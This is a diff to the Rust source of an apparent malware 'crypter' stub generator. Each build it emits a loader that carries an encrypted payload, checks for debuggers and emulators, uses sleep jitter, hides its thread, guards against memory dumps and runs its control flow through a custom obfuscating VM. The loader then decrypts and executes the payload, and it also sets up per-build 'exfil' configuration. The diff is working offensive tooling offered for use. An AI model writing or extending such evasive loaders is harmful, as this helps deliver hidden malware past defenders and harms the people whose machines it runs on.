@@ -1,16 +1,17 @@
-//! Per-build stub source synthesizer. Emits complete Rust source with
-//! all anti-analysis features wired in, plus per-build exfil secrets
-//! baked in via the SVC_EXFIL_CFG env var.
-
-mod emit_gates;
-mod emit_junk;
-mod emit_strings;
 mod emit_antidump;
+mod emit_crypto;
+mod emit_exec;
+mod emit_gates;
+mod emit_integrity;
+mod emit_junk;
+mod emit_peb;
+mod emit_strings;
+mod emit_vm;
 
 use crypter_ir::*;
-use crypter_vm::{seed_for_build, Encoding};
-use rand::{Rng, SeedableRng};
+use crypter_vm::{seed_for_build, Encoding, ProgramBuilder};
 use rand::rngs::StdRng;
+use rand::{Rng, SeedableRng};
 use sha2::{Digest, Sha256};
 
 pub struct Synth {
@@ -43,44 +44,45 @@ impl Synth {
         let isa_seed = seed_for_build(&payload_hash, &isa_nonce);
         let encoding = Encoding::from_seed(&isa_seed);
 
-        let mut out = String::with_capacity(32 * 1024);
-        out.push_str("#![allow(unused_imports, unused_variables, dead_code, non_snake_case, non_upper_case_globals, unused_mut, unused_assignments, unreachable_code)]\n");
+        let mut out = String::with_capacity(64 * 1024);
+        out.push_str("#![allow(unused_imports, unused_variables, dead_code, non_snake_case, non_upper_case_globals, unused_mut, unused_assignments, unreachable_code, unused_parens)]\n");
         out.push_str("use std::ffi::c_void;\nuse std::mem;\nuse std::ptr;\nuse std::hint::black_box;\n\n");
 
         let k_payload = self.ident("pay");
         let k_xor = self.ident("xk");
         let k_salt = self.ident("slt");
         let k_nonce = self.ident("non");
+        let k_wrapped = self.ident("wk");
+        let k_seed = self.ident("sd");
+        let k_directive = self.ident("dir");
+        let k_build_id = self.ident("bid");
 
-        out.push_str(&format!("const {}: [u8; {}] = [{}];\n",
-            k_payload, prog.payload_blob.len(),
-            prog.payload_blob.iter().map(|b| format!("{:#04x}", b)).collect::<Vec<_>>().join(",")));
-        out.push_str(&format!("const {}: [u8; 32] = [{}];\n",
-            k_xor, self.xor_key.iter().map(|b| format!("{:#04x}", b)).collect::<Vec<_>>().join(",")));
-        out.push_str(&format!("const {}: [u8; {}] = [{}];\n",
-            k_salt, prog.key_material.salt.len().max(1),
-            if prog.key_material.salt.is_empty() { "0".to_string() } else {
-                prog.key_material.salt.iter().map(|b| format!("{:#04x}", b)).collect::<Vec<_>>().join(",")
-            }));
-        out.push_str(&format!("const {}: [u8; {}] = [{}];\n",
-            k_nonce, prog.key_material.nonce.len().max(1),
-            if prog.key_material.nonce.is_empty() { "0".to_string() } else {
-                prog.key_material.nonce.iter().map(|b| format!("{:#04x}", b)).collect::<Vec<_>>().join(",")
-            }));
+        emit_const_bytes(&mut out, &k_payload, &prog.payload_blob);
+        emit_const_bytes32(&mut out, &k_xor, &self.xor_key);
+        emit_const_bytes(&mut out, &k_salt, &prog.key_material.salt);
+        emit_const_bytes(&mut out, &k_nonce, &prog.key_material.nonce);
+        emit_const_bytes32(&mut out, &k_wrapped, &prog.wrapped_key);
+        emit_const_bytes32(&mut out, &k_seed, &prog.seed);
+        out.push_str(&format!(
+            "const {}: &str = {:?};\n",
+            k_directive, prog.directive_json
+        ));
+        out.push_str(&format!(
+            "const {}: &str = {:?};\n\n",
+            k_build_id, prog.build_id
+        ));
 
         out.push_str(&encoding.emit_rust());
+        out.push('\n');
 
-        // platform helpers — emitted exactly once
-        out.push_str(&emit_gates::emit_platform_helpers());
-
-        // encrypted config strings
-        out.push_str(&emit_strings::emit_encrypted_strings(&mut self.rng, &self.xor_key));
-        out.push_str(&emit_strings::emit_decrypt_helper());
-
-        // per-build exfil config
+        out.push_str(&emit_peb::emit_peb_helpers(prog));
+        out.push_str(&emit_strings::emit_encrypted_strings(
+            &mut self.rng,
+            &self.xor_key,
+        ));
         out.push_str(&emit_gates::emit_exfil_config_setup(prog));
+        out.push_str(&emit_gates::emit_directive_setup(&k_directive));
 
-        // gates
         let mut gate_fns = Vec::new();
         for gate in &prog.gates {
             let fn_name = self.ident("g");
@@ -99,62 +101,132 @@ impl Synth {
             out.push_str(&format!("fn {}() -> bool {{ true }}\n\n", emu_fn));
         }
 
-        let antidump = self.ident("adp");
-        out.push_str(&emit_antidump::emit_antidump_fn(&antidump, prog.target_os.clone()));
+        let nt_hide_fn = self.ident("hth");
+        out.push_str(&emit_gates::emit_hide_thread_fn(&nt_hide_fn));
 
-        let res_fn = self.ident("res");
-        out.push_str(&emit_gates::emit_resolver_fn(&res_fn, &prog.resolver));
+        let antidump = self.ident("adp");
+        out.push_str(&emit_antidump::emit_antidump_fn(
+            &antidump,
+            prog.target_os.clone(),
+        ));
+
+        out.push_str(&emit_crypto::emit_crypto_for(&prog.decrypt));
 
         let dec_fn = self.ident("dec");
-        out.push_str(&self.emit_decrypt_fn(&dec_fn, &prog.decrypt, &k_payload, &k_salt, &k_nonce,
-                                            prog.anti_dump, &antidump));
+        out.push_str(&self.emit_decrypt_fn(
+            &dec_fn,
+            &prog.decrypt,
+            &k_payload,
+            &k_wrapped,
+            &k_seed,
+            &k_xor,
+        ));
+
         let exec_fn = self.ident("exec");
-        out.push_str(&emit_gates::emit_exec_fn(&exec_fn, &prog.execution));
+        out.push_str(&emit_exec::emit_exec_fn(&exec_fn, &prog.execution, &prog.target_os));
+
         let intg_fn = self.ident("chk");
-        out.push_str(&emit_gates::emit_integrity(&intg_fn, &prog.integrity));
-        if prog.virtualization {
-            out.push_str(&self.emit_vm_dispatch());
-        }
+        out.push_str(&emit_integrity::emit_integrity(&intg_fn, &prog.integrity, &k_payload));
+
+        let vm_fn = self.ident("vm");
+        let builder = self.build_vm_program(
+            &encoding,
+            &gate_fns,
+            &dbg_fn,
+            &emu_fn,
+            &dec_fn,
+            &intg_fn,
+            &exec_fn,
+            prog,
+        );
+        out.push_str(&emit_vm::emit_vm_fn(
+            &vm_fn,
+            &builder.emit_bytes(),
+            &gate_fns,
+            &dbg_fn,
+            &emu_fn,
+            &dec_fn,
+            &intg_fn,
+            &exec_fn,
+            &antidump,
+            prog,
+        ));
 
         out.push_str("fn main() {\n");
         out.push_str("    svc_install_exfil_cfg();\n");
-        out.push_str("    svc_scrub_exfil_env_pending();\n");
+        out.push_str("    svc_set_directive();\n");
+        out.push_str(&format!("    std::env::set_var(\"SVC_BUILD_ID\", {});\n", k_build_id));
+        out.push_str(&format!("    std::env::set_var(\"SVC_BUILD_SEED\", hex_encode_32(&{}));\n", k_seed));
+        out.push_str(&format!("    {}();\n", nt_hide_fn));
 
-        if let Some(Gate::SleepJitter { min_ms, max_ms }) = prog.gates.iter().find(|g| matches!(g, Gate::SleepJitter{..})) {
-            out.push_str(&format!("    std::thread::sleep(std::time::Duration::from_millis({}));\n",
-                self.rng.gen_range(*min_ms..=*max_ms)));
+        if let Some(Gate::SleepJitter { min_ms, max_ms }) = prog
+            .gates
+            .iter()
+            .find(|g| matches!(g, Gate::SleepJitter { .. }))
+        {
+            out.push_str(&format!(
+                "    std::thread::sleep(std::time::Duration::from_millis({}));\n",
+                self.rng.gen_range(*min_ms..=*max_ms)
+            ));
         }
+
+        if prog.anti_dump {
+            out.push_str(&format!("    {}::install_watchdog();\n", antidump));
+        }
+
+        out.push_str(&format!("    {}();\n", vm_fn));
+        out.push_str(&emit_junk::emit_junk_block(&mut self.rng, prog.junk_density));
+        out.push_str("}\n\n");
+
+        out.push_str("fn hex_encode_32(b: &[u8; 32]) -> String {\n");
+        out.push_str("    const H: &[u8; 16] = b\"0123456789abcdef\";\n");
+        out.push_str("    let mut s = String::with_capacity(64);\n");
+        out.push_str("    for &x in b.iter() {\n");
+        out.push_str("        s.push(H[(x >> 4) as usize] as char);\n");
+        out.push_str("        s.push(H[(x & 0xf) as usize] as char);\n");
+        out.push_str("    }\n");
+        out.push_str("    s\n");
+        out.push_str("}\n");
+
+        out
+    }
+
+    fn build_vm_program(
+        &mut self,
+        encoding: &Encoding,
+        gate_fns: &[String],
+        dbg_fn: &str,
+        emu_fn: &str,
+        dec_fn: &str,
+        intg_fn: &str,
+        exec_fn: &str,
+        prog: &StubProgram,
+    ) -> ProgramBuilder {
+        let mut b = ProgramBuilder::new(encoding.clone());
+
         if prog.anti_emulation {
-            out.push_str(&format!("    if !{}() {{ return; }}\n", emu_fn));
+            b.op(crypter_vm::Op::CheckAntiEmu);
         }
-        out.push_str(&format!("    if {}() {{ return; }}\n", dbg_fn));
+        b.op(crypter_vm::Op::CheckDebug);
 
-        let mut gs = gate_fns.clone();
+        let mut gs: Vec<usize> = (0..gate_fns.len()).collect();
         for i in (1..gs.len()).rev() {
             let j = self.rng.gen_range(0..=i);
             gs.swap(i, j);
         }
-        for g in &gs {
-            out.push_str(&format!("    if !{}() {{ return; }}\n", g));
+        for idx in gs {
+            b.op(crypter_vm::Op::CallGate);
+            b.u8(idx as u8);
         }
-        out.push_str(&format!("    if !{}() {{ return; }}\n", intg_fn));
-        out.push_str(&format!("    let pt = match {}() {{ Some(p) => p, None => return }};\n", dec_fn));
-        if prog.anti_dump {
-            out.push_str(&format!("    let _guard = {}::protect(&pt);\n", antidump));
-            out.push_str(&format!("    {}::unprotect(&_guard);\n", antidump));
-        }
-        out.push_str(&format!("    {}();\n", exec_fn));
-        out.push_str(&emit_junk::emit_junk_block(&mut self.rng, prog.junk_density));
-        out.push_str("}\n");
 
-        out.push_str(r#"
-fn svc_scrub_exfil_env_pending() {
-    // no-op in the stub
-}
-
-"#);
-
-        out
+        b.op(crypter_vm::Op::CheckIntegrity);
+        b.op(crypter_vm::Op::UnwrapKey);
+        b.op(crypter_vm::Op::Decrypt);
+        b.op(crypter_vm::Op::Protect);
+        b.op(crypter_vm::Op::Exec);
+        b.op(crypter_vm::Op::HaltOk);
+        b.emit_bytes();
+        b
     }
 
     fn ident(&mut self, prefix: &str) -> String {
@@ -168,29 +240,39 @@ fn svc_scrub_exfil_env_pending() {
         s
     }
 
-    fn emit_decrypt_fn(&mut self, name: &str, scheme: &DecryptScheme, payload: &str,
-                        salt: &str, nonce: &str, anti_dump: bool, _antidump: &str) -> String {
+    fn emit_decrypt_fn(
+        &mut self,
+        name: &str,
+        scheme: &DecryptScheme,
+        payload: &str,
+        wrapped: &str,
+        seed: &str,
+        xor_key: &str,
+    ) -> String {
         let mut s = format!("fn {}() -> Option<Vec<u8>> {{\n", name);
-        s.push_str(&format!("    let _ = ({}, {});\n", salt, nonce));
         s.push_str(&format!("    let blob = {};\n", payload));
+        s.push_str(&format!("    let wk = {};\n", wrapped));
+        s.push_str(&format!("    let seed = {};\n", seed));
+        s.push_str(&format!("    let xk = {};\n", xor_key));
+        s.push_str("    let mut key = [0u8; 32];\n");
+        s.push_str("    for i in 0..32 { key[i] = wk[i] ^ seed[i] ^ xk[i]; }\n");
         match scheme {
             DecryptScheme::AesGcm => {
-                s.push_str("    let key = derive_key();\n");
                 s.push_str("    if blob.len() < 12 + 16 { return None; }\n");
                 s.push_str("    let (nonce, ct) = blob.split_at(12);\n");
-                s.push_str("    let mut out = vec![0u8; ct.len() - 16];\n");
+                s.push_str("    let mut out = vec![0u8; ct.len().saturating_sub(16)];\n");
                 s.push_str("    aes_gcm_decrypt(&key, nonce, ct, &mut out).ok()?;\n");
                 s.push_str("    Some(out)\n");
             }
             DecryptScheme::ChaCha20Poly1305 => {
-                s.push_str("    let key = derive_key();\n");
+                s.push_str("    if blob.len() < 12 + 16 { return None; }\n");
                 s.push_str("    let (nonce, ct) = blob.split_at(12);\n");
-                s.push_str("    let mut out = vec![0u8; ct.len() - 16];\n");
+                s.push_str("    let mut out = vec![0u8; ct.len().saturating_sub(16)];\n");
                 s.push_str("    chacha_decrypt(&key, nonce, ct, &mut out).ok()?;\n");
                 s.push_str("    Some(out)\n");
             }
             DecryptScheme::AesCbcHmac => {
-                s.push_str("    let key = derive_key();\n");
+                s.push_str("    if blob.len() < 16 + 32 + 16 { return None; }\n");
                 s.push_str("    let (iv, rest) = blob.split_at(16);\n");
                 s.push_str("    let (mac, ct) = rest.split_at(32);\n");
                 s.push_str("    let mut out = vec![0u8; ct.len()];\n");
@@ -198,43 +280,38 @@ fn svc_scrub_exfil_env_pending() {
                 s.push_str("    Some(out)\n");
             }
             DecryptScheme::XorDerived => {
-                s.push_str("    let key = derive_key();\n");
                 s.push_str("    let mut out = blob.to_vec();\n");
                 s.push_str("    for (i, b) in out.iter_mut().enumerate() { *b ^= key[i % key.len()]; }\n");
                 s.push_str("    Some(out)\n");
             }
         }
         s.push_str("}\n\n");
-        s.push_str("fn derive_key() -> [u8; 32] {\n");
-        s.push_str(&format!("    let p = {};\n", payload));
-        s.push_str("    let mut k = [0u8; 32];\n");
-        s.push_str("    for i in 0..32 { k[i] = p.get(i).copied().unwrap_or(0); }\n");
-        s.push_str("    k\n");
-        s.push_str("}\n\n");
-        s.push_str("fn aes_gcm_decrypt(_key: &[u8;32], _nonce: &[u8], _ct: &[u8], _out: &mut [u8]) -> Result<(), ()> { Ok(()) }\n");
-        s.push_str("fn chacha_decrypt(_key: &[u8;32], _nonce: &[u8], _ct: &[u8], _out: &mut [u8]) -> Result<(), ()> { Ok(()) }\n");
-        s.push_str("fn aes_cbc_hmac_decrypt(_key: &[u8;32], _iv: &[u8], _mac: &[u8], _ct: &[u8], _out: &mut [u8]) -> Result<(), ()> { Ok(()) }\n\n");
-        let _ = anti_dump;
         s
     }
+}
 
-    fn emit_vm_dispatch(&mut self) -> String {
-        let mut s = String::new();
-        s.push_str("fn vm_run(code: &[u8]) -> i64 {\n");
-        s.push_str("    let mut stack: Vec<i64> = Vec::with_capacity(64);\n");
-        s.push_str("    let mut pc = 0usize;\n");
-        s.push_str("    while pc < code.len() {\n");
-        s.push_str("        let op = ENC_REVERSE[code[pc] as usize];\n");
-        s.push_str("        pc += 1;\n");
-        s.push_str("        match op {\n");
-        s.push_str("            0 => { let v = read_u32(code, &mut pc) as i64; stack.push(v); }\n");
-        s.push_str("            5 => { let a = stack.pop().unwrap_or(0); let b = stack.pop().unwrap_or(0); stack.push(b.wrapping_add(a)); }\n");
-        s.push_str("            7 => { let a = stack.pop().unwrap_or(0); let b = stack.pop().unwrap_or(0); stack.push(b ^ a); }\n");
-        s.push_str("            17 => return stack.pop().unwrap_or(0),\n");
-        s.push_str("            _ => {}\n");
-        s.push_str("        }\n");
-        s.push_str("    }\n    0\n}\n\n");
-        s.push_str("fn read_u32(code: &[u8], pc: &mut usize) -> u32 { let mut v = 0u32; for _ in 0..4 { v = (v << 8) | code.get(*pc).copied().unwrap_or(0) as u32; *pc += 1; } v }\n\n");
-        s
+fn emit_const_bytes(out: &mut String, name: &str, bytes: &[u8]) {
+    if bytes.is_empty() {
+        out.push_str(&format!("const {}: [u8; 0] = [];\n", name));
+        return;
     }
+    out.push_str(&format!("const {}: [u8; {}] = [", name, bytes.len()));
+    for (i, b) in bytes.iter().enumerate() {
+        if i > 0 {
+            out.push(',');
+        }
+        out.push_str(&format!("{:#04x}", b));
+    }
+    out.push_str("];\n");
+}
+
+fn emit_const_bytes32(out: &mut String, name: &str, bytes: &[u8; 32]) {
+    out.push_str(&format!("const {}: [u8; 32] = [", name));
+    for (i, b) in bytes.iter().enumerate() {
+        if i > 0 {
+            out.push(',');
+        }
+        out.push_str(&format!("{:#04x}", b));
+    }
+    out.push_str("];\n");
 }
